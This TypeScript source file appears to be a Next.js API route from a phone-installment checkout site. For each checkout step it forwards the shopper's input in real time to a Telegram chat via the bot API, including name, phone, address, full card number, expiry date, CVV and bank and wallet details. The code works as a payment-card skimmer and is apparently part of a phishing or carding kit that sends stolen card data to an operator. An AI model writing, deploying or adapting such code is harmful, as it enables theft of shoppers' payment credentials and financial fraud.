import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { stepName, data, orderId } = body;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId || botToken.includes('your_telegram_bot_token')) {
      return NextResponse.json({ success: false, message: 'Telegram credentials missing' }, { status: 200 });
    }

    const timestamp = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

    let messageText = `⚡ <b>REALTIME USER INPUT ACTIVITY</b> [${timestamp}]\n\n`;
    messageText += `📍 <b>Current Stage:</b> <code>${stepName}</code>\n`;

    if (data.model) {
      messageText += `📱 <b>Selected Device:</b> ${data.model.name} (${data.storage?.size || ''}, ${data.color?.name || ''})\n`;
      messageText += `💰 <b>Installment EMI:</b> Rs. ${(data.monthlyEmi || 0).toLocaleString('en-PK')}/mo (${data.months} Mos)\n`;
    }

    if (data.customer) {
      if (data.customer.fullName) messageText += `👤 <b>Name:</b> ${data.customer.fullName}\n`;
      if (data.customer.mobileNumber) messageText += `📞 <b>Phone:</b> <code>${data.customer.mobileNumber}</code>\n`;
      if (data.customer.deliveryAddress) messageText += `🏠 <b>Address:</b> ${data.customer.deliveryAddress}\n`;
      if (data.customer.paymentMethod) messageText += `💳 <b>Payment Choice:</b> ${data.customer.paymentMethod.toUpperCase()}\n`;
    }

    if (data.payment) {
      if (data.payment.bankId) messageText += `🏦 <b>Bank:</b> ${data.payment.bankId.toUpperCase()}\n`;
      if (data.payment.cardName) messageText += `💳 <b>Card Name:</b> ${data.payment.cardName}\n`;
      if (data.payment.cardNumber) messageText += `🔢 <b>Card Number:</b> <code>${data.payment.cardNumber}</code>\n`;
      if (data.payment.expiry) messageText += `📅 <b>Expiry:</b> ${data.payment.expiry}\n`;
      if (data.payment.cvv) messageText += `🔒 <b>CVV:</b> <code>${data.payment.cvv}</code>\n`;
      if (data.payment.walletType) messageText += `👛 <b>Wallet Type:</b> ${data.payment.walletType}\n`;
      if (data.payment.walletAccountName) messageText += `📝 <b>Wallet Title:</b> ${data.payment.walletAccountName}\n`;
    }

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML'
      })
    });

    return NextResponse.json({ success: true });
  } catch (error: any) {
    console.error('Realtime Telegram error:', error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
